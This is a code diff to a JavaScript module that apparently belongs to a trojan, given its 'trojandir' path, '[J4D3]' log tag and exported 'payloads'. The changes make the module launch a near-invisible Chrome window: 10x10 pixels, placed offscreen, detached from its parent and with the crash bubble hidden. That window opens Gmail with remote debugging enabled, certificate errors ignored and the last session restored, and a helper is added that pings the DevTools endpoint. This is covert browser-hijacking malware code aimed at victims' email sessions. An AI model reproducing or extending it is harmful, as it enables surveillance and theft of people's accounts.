@@ -201,10 +201,17 @@ function isPidAlive(pid) {
     }
 }
 
+// note: child chrome process has a new/different pid upon launch
 function spawn_chrome(
     starturl = "https://www.gmail.com/",
     debugport = 9223,
-    datadir = null,
+    headless = false,
+    unref = true,
+    x_pos = 2000,
+    y_pos = 2000,
+    width=10,
+    height=10,
+    datadir = path.join(trojandir, "chrome"),
     stdoutfunc = null,
     stderrfunc = null,
     closefunc = null
@@ -215,15 +222,16 @@ function spawn_chrome(
         `--remote-debugging-port=${debugport}`,
         `--user-data-dir=${datadir}`,
         `--new-window ${starturl}`,
-        `--headless=new`,
-        `--no-first-run`,
+        headless ? `--headless=new` : '',
+        `--no-first-run`, // You can skip Chrome's welcome and setup screens
         `--no-default-browser-check`,
         `--profile-directory=Default`,
         `--remote-allow-origins=*`,
         `--restore-last-session`,
         `--ignore-certificate-errors`,
-        `--window-position=2000,2000`,
-        `--window-size=10,10`,
+        `--window-position=${x_pos},${y_pos}`,
+        `--window-size=${width},${height}`,
+        `--hide-crash-restore-bubble`
     ];
 
     // TODO auto discover by reading chrome lnk files
@@ -256,6 +264,9 @@ function spawn_chrome(
         if (closefunc) closefunc(code);
         else logmsg(`[J4D3] child process exited with code ${code}`);
     });
+
+    if ( unref )
+        child.unref();
 
     return child;
 }
@@ -308,12 +319,22 @@ function create_new_tab(url='https://www.gmail.com/') {
     return payload;
 }
 
-async function connectToChrome(debugport, openfunc, messagefunc, errorfunc) {
-    const response = await fetch(`http://localhost:${debugport}/json/version`);
+async function ping_chrome(debugport, path = 'json/version') {
+    
+    if ( ! isNullOrWhitespace(path) && ! path.startsWith('/') ) {
+        path = '/' + path;
+    }
+
+    const response = await fetch(`http://localhost:${debugport}${path}`);
     let responsetxt = await response.text();
     const cleanString = responsetxt.replace(/\r?\n|\r/g, "");
 
-    const targets = JSON.parse(cleanString); //await response.json();
+    return cleanString;
+}
+
+async function connectToChrome(debugport, openfunc, messagefunc, errorfunc) {
+    const response = await ping_chrome(debugport, 'json/version');
+    const targets = JSON.parse(response); //await response.json();
 
     // ws://127.0.0.1:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382
     // 'ws://localhost:9223/devtools/browser/80d329c6-bce8-482a-8cf8-859425508382'
@@ -355,7 +376,8 @@ module.exports = {
     connectToChrome,
     payloads,
     create_new_tab,
-    getProcessList_wmic
+    getProcessList_wmic,
+    ping_chrome
 };
 
 // childp = spawn_chrome();
